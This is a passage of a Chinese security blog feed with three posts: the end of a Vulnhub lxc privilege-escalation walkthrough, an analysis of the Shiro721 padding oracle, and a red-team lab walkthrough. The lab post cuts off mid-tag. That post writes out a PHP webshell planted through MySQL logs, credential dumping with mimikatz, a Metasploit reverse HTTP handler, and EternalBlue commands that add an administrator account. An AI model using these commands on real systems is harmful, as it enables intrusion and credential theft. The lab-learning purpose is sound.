src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/26.png" class><p>还有一个 S0mextras 目录没有去看</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/27.png" class><p>莫非存在ssh远程登录的账号密码？cat看一下</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/28.png" class><p>是有的，远程登录ssh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh n0nr00tuser@192.168.111.130</span><br></pre></td></tr></table></figure><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/29.png" class><p>OK，终于有目标机器的交互式shell了</p><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><p>输入 sudo -l 看看有没有sudo滥用的情况，尝试用有root权限的命令来提权</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/30.png" class><p>很明显没有，那就换一种思路，找找内核漏洞</p><p>输入 uname -a 查看操作系统相关信息</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/31.png" class><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/32.png" class><p>比较新，网上搜了搜好像没有相关的漏洞提权脚本</p><p>再尝试用suid提权思路，输入命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">这个命令是从根目录查找具有s权限的二进制文件，并将标准错误输出重定向到/dev/null</span><br></pre></td></tr></table></figure><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/33.png" class><p>可以尝试一下这个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lxc是一种轻量级的虚拟化技术，用于在单个Linux主机上创建和管理多个隔离的容器。容器是一种虚拟化形式，允许你在同一物理主机上运行多个独立的操作系统实例，但它们共享主机操作系统的内核，从而减少了资源开销和提高了性能。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lxc提权的原理大致就是用户创建一个容器,再用容器挂载宿主机的磁盘,然后用容器的权限去操作宿主机磁盘内容从而达到提权</span><br></pre></td></tr></table></figure><p>漏洞库搜索相关脚本</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/34.png" class><p>把脚本复制到当前目录，并且要编辑 输入 :set ff&#x3D;unix，不然运行会报语法错误，运行脚本还需要在github上下载一个文件</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/35.png" class><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/36.png" class><p>就是这个gz压缩包，kali开启web服务，把者两个文件下载到目标机器的tmp目录下，因为tmp目录通常是给足了权限的</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/37.png" class><p>给sh脚本添加执行权限，执行该脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./46978.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br></pre></td></tr></table></figure><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/38.png" class><p>提权成功，找flag，在&#x2F;mnt&#x2F;root&#x2F;root目录下</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/39.png" class><p>成功找到flag。</p><p>打靶感悟：信息收集尤为重要</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro721漏洞分析</title>
      <link href="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>来填坑了，拖了很久的shiro721漏洞，涉及的加密解密挺让人头疼的。注：水文，写给自己看的</p><p>漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p><p>以往版本中，AES加密的key是已知固定的，但是在1.2.5版本之后，key就是随机的了，我们不可能猜到随机的key值，但是可以绕过key构造任意密文执行反序列化</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>环境搭建就不多说了，网上有很多的教程。</p><p>Apache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：</p><ul><li>开启 rememberMe 功能；</li><li>rememberMe 值使用 AES-CBC 模式解密；</li><li>能获取到正常 Cookie，即用户正常登录的 Cookie 值；</li><li>密文可控；</li></ul><h3 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h3><p>以下思路来自此文章：<a href="https://goodapple.top/archives/217%EF%BC%8C%E5%B9%B6%E5%9F%BA%E4%BA%8E%E6%AD%A4%E6%96%87%E7%AB%A0%E5%81%9A%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%E6%98%8E">https://goodapple.top/archives/217，并基于此文章做一些简单的说明</a></p><p>Padding 填充，AES是分组加密，消息明文会分为特定长度的分组，比如8字节或者16字节，CBC是分组模式，在分组密码中，有两种常见的填充算法，分别是Pkcs5Padding和Pkcs7Padding。而在shiro框架中采用的是 Pkcs5Padding</p><p>举一个例子：明文为abcdefghijk，则分组与填充为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a,b,c,d,e,f,g,h</span><br><span class="line">i,j,k,0x05,0x05,0x05,0x05,0x05</span><br></pre></td></tr></table></figure><p>缺多少位，填充多少，如果明文恰好能分组，则填充下一分组全为8个0x08,无论如何都是要有填充的</p><p>加密过程与解密过程如下</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" class><p>网上搜的大多都是如何利用 Padding Oracle Attack 来破解明文，而在shiro框架的利用上，我们只需要构造恶意序列化串的合理密文，发送到服务端能顺利解密并且反序列化</p><p>以下摘抄与此片文章：<a href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89">浅析Shiro Padding Oracle Attack</a>)</p><p>这里简单说下 Padding Oracle Attack 加密数据整体过程：</p><ol><li>选择一个明文 <code>P</code>，用来生成你想要的密文<code>C</code>；</li><li>使用适当的 Padding 将字符串填充为块大小的倍数，然后将其拆分为从 1 到 N 的块；</li><li>生成一个随机数据块（<code>C[n]</code> 表示最后一个密文块）；</li><li>对于每一个明文块，从最后一块开始：<ol><li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块<code>C[n+1]</code>（如果是第一轮则是随机块）组合成的；</li><li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li><li>在计算完整个块之后，将它与明文块 <code>P[n]</code> 进行XOR一起创建 <code>C[n]</code>；</li><li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；</li></ol></li></ol><p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。</p><p>实际上利用 Padding Oracle Attack 攻击获取明文的原理是理解了，就是不太理解如何合理加密的</p><h2 id="0x03-漏洞代码分析"><a href="#0x03-漏洞代码分析" class="headerlink" title="0x03 漏洞代码分析"></a>0x03 漏洞代码分析</h2><p>shiro 的 Padding Oracle Attack 攻击就类似与布尔盲注，需要有报错回显</p><p>在Apache Shiro的场景中，这个服务端的两个不同的响应特征为：</p><ul><li>Padding Oracle错误时，服务端响应报文的Set-Cookie头字段返回<code>rememberMe=deleteMe</code>；</li><li>Padding Oracle正确时，服务端返回正常的响应报文内容；</li></ul><p>下面分析代码</p><h3 id="key的生成"><a href="#key的生成" class="headerlink" title="key的生成"></a>key的生成</h3><p>在 AbstractRememberMeManager 类的构造方法中</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png" class><p>函数返回值，并不是硬编码了，跟进到 generateNewKey 方法中</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" class><p>init方法主要是对AES算法进行初始化，跟进这个方法</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" class><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" class><h3 id="Padding-的错误处理"><a href="#Padding-的错误处理" class="headerlink" title="Padding 的错误处理"></a>Padding 的错误处理</h3><p>断点下在解密函数 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt() 中</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" class><p>获取密文，利用decrypt()函数解密，一路跟进crypt</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" class><p>来到doFinal函数，而在这个函数里面，做了一些错误处理，IllegalBlockSizeException 和 BadPaddingException 这两个异常，分别用于捕获块大小异常和填充错误异常，抛出的异常最终由 getRememberedPrincipals 方法捕获</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" class><p>捕获到异常后会执行 onRememberedPrincipalFailure 方法，跟进，</p><p>实际上会走到 forgetIdentity 方法</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" class><p>这时候就开始处理请求与响应了，跟进 getCookie().removeFrom</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" class><p>开始设置响应包了，其中 DELETED_COOKIE_VALUE 就是 deleteMe</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" class><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>因为要爆破，所以攻击的时间非常长，网上也有那种exp脚本，使用工具ShiroExploit</p><img src="/2023/10/15/shiro721%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" class><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>水文一篇，主要写一些大致的知识点（写给自己看的）</p><p>以下是详细的分析文章：</p><p><a href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/#0x01-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/#0x01-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86</a></p><p><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p><a href="https://xz.aliyun.com/t/7207#toc-3">https://xz.aliyun.com/t/7207#toc-3</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估(红日靶场一)</title>
      <link href="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
      <url>/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-靶场环境"><a href="#0x01-靶场环境" class="headerlink" title="0x01 靶场环境"></a>0x01 靶场环境</h2><p>靶场搭建这一块就不再说了，<a href="https://blog.csdn.net/qq_51295677">errorr0</a>师傅写的很详细，我的环境配置就是跟着他的文章搭建的</p><p><a href="https://blog.csdn.net/qq_51295677/article/details/124174404">https://blog.csdn.net/qq_51295677/article/details/124174404</a></p><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/1.png" class><p>加上攻击机一共四台靶机</p><h3 id="环境IP配置"><a href="#环境IP配置" class="headerlink" title="环境IP配置"></a>环境IP配置</h3><blockquote><p>kali (攻击机)：192.168.19.140</p><p>Windows 7 (web服务器，两网卡)：192.168.19.144（外网和kali连通）、192.168.5.128（内网）</p><p>Windows 2008 (域控)：192.168.5.130</p><p>Win2k3 (域管)：192.168.5.129</p></blockquote><h2 id="0x02-外网渗透"><a href="#0x02-外网渗透" class="headerlink" title="0x02 外网渗透"></a>0x02 外网渗透</h2><h3 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h3><p>win7作为一台服务器暴露在外网，与kali机存在同一网段</p><p>用nmap扫描网段，找到外网服务器的真实IP</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/2.png" class><p>外网IP为144结尾，那么再用nmap详细扫描一下开放的端口以及服务</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/3.png" class><p>开的端口挺多，主要就是web服务，从扫描信息来看，得知服务器是一个Win32的机器</p><p>访问服务器IP的80端口</p><p>主页就是一个phpStudy的探针</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/4.png" class><p>底部可以连接数据库，可以试一下账号密码，mysql默认的话，账号密码都是root</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/5.png" class><p>账号密码正确，那么想远程连接一下mysql，理论上是可行的</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/6.png" class><p>但是对外来IP做了限制，连接失败，回头继续从web入手</p><p>页面没啥东西了，扫一下目录</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/7.png" class><p>有phpmyadmin，这下又有突破口了，需要登录，账号密码为root，root直接可以登录进去</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/8.png" class><h3 id="phpMyadmin写shell"><a href="#phpMyadmin写shell" class="headerlink" title="phpMyadmin写shell"></a>phpMyadmin写shell</h3><p>能写入shell拿权限才是最舒服的</p><p>通过mysql写文件，一种是利用outfile，不过在mysql5.0以上就需要用户有写权限，和mysql配置中开启了相应的选项才能写入文件</p><p>第二种就是修改日志文件的方式，在phpMyadmin中可以执行sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br><span class="line">查询系统变量的信息，在这里查新有关general的系统变量</span><br></pre></td></tr></table></figure><p>查看日志保存状态</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/9.png" class><p>本来是关闭日志保存的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line">设置全局变量</span><br></pre></td></tr></table></figure><p>执行这个sql语句可以修改general_log的值，接下来修改日志保存的位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p>绝对路径可以在主页面的探针信息中找到</p><p>查看日志保存状态，全局变量是否修改成功</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/10.png" class><p>执行sql语句，将一句话木马保存在日志中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php @eval($_REQUEST[&quot;shell&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/11.png" class><p>成功拿到shell，拿下web服务器，剩下的就向内网渗透了</p><h2 id="0x03-内网渗透"><a href="#0x03-内网渗透" class="headerlink" title="0x03 内网渗透"></a>0x03 内网渗透</h2><h3 id="Cobalt-Strike远控"><a href="#Cobalt-Strike远控" class="headerlink" title="Cobalt Strike远控"></a>Cobalt Strike远控</h3><p>连接蚁剑，这是Windows的操作系统，通常是没有nc或者bash的，所以要实现远控，就要利用Cobalt Strike来生成exe的马，kali机作为服务端，主机Win11作为客户端启动Cobalt Strike</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/12.png" class><p>创建监听器用于木马回连，注意host为Cobalt Strike服务端，也就是kali机的ip，填了HTTP端口（上线）就不用再填写监听的端口了</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/17.png" class><p>用CS生成Windows的后门程序，要使用64位的payload</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/13.png" class><p>将生成的exe的后门程序通过蚁剑上传到服务器</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/14.png" class><p>在服务器上运行exe可执行程序</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/15.png" class><p>可以看到成功上线CS，右键开启一个会话交互</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/16.png" class><p>通常来说，CS服务器默认60s会重连一次，所以指令会有延迟，执行sleep 0 加快回显，输入命令看看</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/18.png" class><p><code>NT AUTHORITY\SYSTEM</code> 是 Windows 操作系统中的一个高度特权的帐户，通常也被称为 “System” 帐户，它具有对操作系统和系统资源的广泛访问权限，包括文件系统、注册表、系统服务、安全子系统等。所以不需要来提权了</p><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>查看主机的网络配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/19.png" class><p>发现5网段的内网地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net view /domain</span><br><span class="line">列出指定域中的共享资源和计算机。</span><br><span class="line">已知域为GOD</span><br><span class="line">执行net view /domain:GOD 可以列出该域中所有共享的计算机</span><br></pre></td></tr></table></figure><p>发现存在域</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/20.png" class><p>抓取明文密码，在Cobalt Strike 中有个凭证提权的模块，里面有抓取明文密码的功能，使用 hashdump 和 logonpasswords 读内存和注册表密码，并且可以在密码凭证下查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump 获取密码哈希值，便于后续利用破解工具破解哈希得到密码</span><br><span class="line">logonpasswords 是mimikatz的一个命令，用于抓取密码</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/21.png" class><h4 id="返回会话到msf"><a href="#返回会话到msf" class="headerlink" title="返回会话到msf"></a>返回会话到msf</h4><p>将会话返回到kali机上，与msf联动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">#创建一个处理多个攻击负载的处理程序，用于接收受感染目标的连接。</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">#在这种情况下，所选的攻击负载是 Meterpreter 的反向 HTTP Shell。Meterpreter 是 Metasploit Framework 中的一个功能强大的后门工具，反向 HTTP Shell 攻击负载使用 HTTP 协议来与目标计算机通信</span><br><span class="line">set lhost 本机ip</span><br><span class="line">#设置主机ip</span><br><span class="line">set lport 接受的端口</span><br><span class="line">#设置监听的端口</span><br><span class="line">exploit 执行</span><br></pre></td></tr></table></figure><p>设置自己在kali中监听的主机ip和端口，然后在cs中新建一个foreign监听的listeners</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/22.png" class><p>对于上线的主机，选择这个foreign监听的listeners，新建一个会话，然后成功将这个会话返回给msf</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/23.png" class><h4 id="建立socket代理"><a href="#建立socket代理" class="headerlink" title="建立socket代理"></a>建立socket代理</h4><p>在msf中执行 run post&#x2F;multi&#x2F;manage&#x2F;autoroute 新建路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute 是 Metasploit Framework 中的一个命令，用于执行一个名为 &quot;autoroute&quot; 的后渗透测试模块。这个模块的主要功能是配置路由，以便在受感染的目标网络上建立路由到其他子网或目标的通信路径。</span><br></pre></td></tr></table></figure><p>执行 run autoroute -p 查看路由</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/24.png" class><p>挂起会话，建立socks代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">#将当前 Meterpreter 会话（如果存在）放入后台，以便可以执行其他操作</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">#该模块允许创建一个 SOCKS 代理服务器</span><br><span class="line">set VERSION 4a</span><br><span class="line">#设置 SOCKS 代理服务器的版本</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">#设置 SOCKS 代理服务器监听的主机 IP 地址。在这里，它设置为 127.0.0.1，表示只监听本地主机。</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>执行完exploit后，挂起一个job 列出所有当前运行的后台任务</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/25.png" class><p>修改 proxychains4.conf 配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4.conf 是 ProxyChains 的配置文件，用于配置 ProxyChains 工具的行为。</span><br><span class="line">ProxyChains 是一个用于通过代理服务器进行网络通信的工具，它可以让您在绕过防火墙、匿名化网络通信或访问受限资源时，通过代理服务器传输数据。</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/26.png" class><p>使用arp 探测内网存活主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set RHOSTS 192.168.5.0/24</span><br><span class="line">#设置扫描的内网网段</span><br><span class="line">set SESSION 1</span><br><span class="line">#设置要在哪个 Meterpreter 会话中执行 ARP 扫描</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/27.png" class><p>除web服务器外，有两台内网主机。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.5.129/24</span><br><span class="line">192.168.5.130/24</span><br></pre></td></tr></table></figure><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>对其他内网主机进行端口探测</p><p>Cobalt Strike中可以对域管进行端口扫描，搭建代理使用nmap扫描扫不全端口，不知道为什么，坑了我好久</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/28.png" class><p>扫描到445端口，可以打一波永恒之蓝（要是在实战中，估计就与目标无缘了）打64位系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set COMMAND net user</span><br><span class="line">#设置命令 这里的命令是net user  用于查看和管理用户帐户</span><br><span class="line">set RHOST 192.168.5.129</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/29.png" class><p>攻击成功，拿到shell，试着对域管主机添加用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND net user hack xilitter@123 /add</span><br></pre></td></tr></table></figure><p>然后把添加的用户加入管理员组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND net localgroup administrators hack /add</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/30.png" class><p>开启23端口，telnet服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND sc config tlntsvr start= auto</span><br><span class="line">#使 Telnet 服务在系统启动时自动启动</span><br><span class="line">set COMMAND net start telnet</span><br><span class="line">#启动 Telnet 服务。一旦服务启动，系统将允许远程 Telnet 连接</span><br><span class="line">set COMMAND netstat -an</span><br><span class="line">#列出所有当前网络连接和端口状态</span><br></pre></td></tr></table></figure><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/31.png" class><p>成功开启，利用我们刚添加的用户信息远程登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains telnet 192.168.5.129</span><br></pre></td></tr></table></figure><p>注意要用代理对我们的流量进行转发</p><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/32.png" class><p>能够成功执行命令，拿下域里的一台机器，ctrl+] 再输入q退出telnet</p><p>还有一台域控，利用同样的方法扫描端口，存在445端口，同样的方法去打，添加用户</p><img 